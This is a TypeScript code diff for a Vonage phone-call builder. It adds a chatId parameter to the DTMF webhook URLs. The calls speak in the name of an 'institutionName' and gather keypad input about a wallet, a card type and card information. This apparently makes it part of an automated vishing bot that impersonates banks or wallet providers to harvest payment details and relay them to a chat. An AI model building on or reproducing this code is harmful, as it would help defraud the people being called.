@@ -32,6 +32,7 @@ const nccoPrep = (
   institutionName: string,
   language: string,
   step: string,
+  chatId: number,
   wallet?: string,
   cardType?: string,
   askCardInfo?: string,
@@ -48,7 +49,7 @@ const nccoPrep = (
         },
         {
           eventUrl: [
-            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}`,
+            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}/${chatId}`,
           ],
           action: 'input',
           type: ['dtmf'],
@@ -69,7 +70,7 @@ const nccoPrep = (
         },
         {
           eventUrl: [
-            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?askCardInfo=${askCardInfo}`,
+            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
           ],
           action: 'input',
           type: ['dtmf'],
@@ -92,7 +93,7 @@ const nccoPrep = (
           eventUrl: [
             `${
               process.env.ENDPOINT_URL
-            }/vonage-webhook/dtmf/${language}/${step}?wallet=${wallet
+            }/vonage-webhook/dtmf/${language}/${step}/${chatId}?wallet=${wallet
               ?.replace(/\s/g, '')
               .toLowerCase()}`,
           ],
@@ -115,7 +116,7 @@ const nccoPrep = (
         },
         {
           eventUrl: [
-            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}?cardType=${cardType}`,
+            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
           ],
           action: 'input',
           type: ['dtmf'],
@@ -145,8 +146,24 @@ export const vonageMakeACall: any = ({
     /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
       to,
     )
-      ? nccoPrep(institutionName, 'en-GB', step, wallet, cardType, askCardInfo)
-      : nccoPrep(institutionName, 'en-US', step, wallet, cardType, askCardInfo);
+      ? nccoPrep(
+          institutionName,
+          'en-GB',
+          step,
+          chatId,
+          wallet,
+          cardType,
+          askCardInfo,
+        )
+      : nccoPrep(
+          institutionName,
+          'en-US',
+          step,
+          chatId,
+          wallet,
+          cardType,
+          askCardInfo,
+        );
 
   // @ts-expect-error create actually exist on vonage object
   return vonage.calls.create(
